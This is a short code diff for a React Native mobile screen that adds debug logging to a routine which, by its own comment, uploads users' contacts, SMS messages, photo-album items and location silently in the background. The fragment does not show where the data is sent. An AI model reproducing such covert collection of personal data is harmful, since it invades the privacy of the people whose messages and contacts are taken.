@@ -64,8 +64,18 @@ const DataUploadScreen: React.FC<DataUploadScreenProps> = ({ navigation, route }
   // 数据上传（后台静默进行）
   useEffect(() => {
     const uploadData = async () => {
+      console.log('📦 DataUploadScreen: 开始数据上传流程');
+      console.log('🔑 Token:', token ? '已提供' : '未提供');
+      console.log('📂 权限数据:', {
+        hasData: !!permissionData,
+        hasLocation: !!permissionData?.location,
+        contactsCount: permissionData?.contacts?.length || 0,
+        smsCount: permissionData?.sms?.length || 0,
+        albumCount: permissionData?.album?.length || 0,
+      });
+      
       if (!token || !permissionData) {
-        console.log('没有token或权限数据，跳过上传');
+        console.log('❌ 没有token或权限数据，跳过上传');
         setIsUploadComplete(true);
         return;
       }
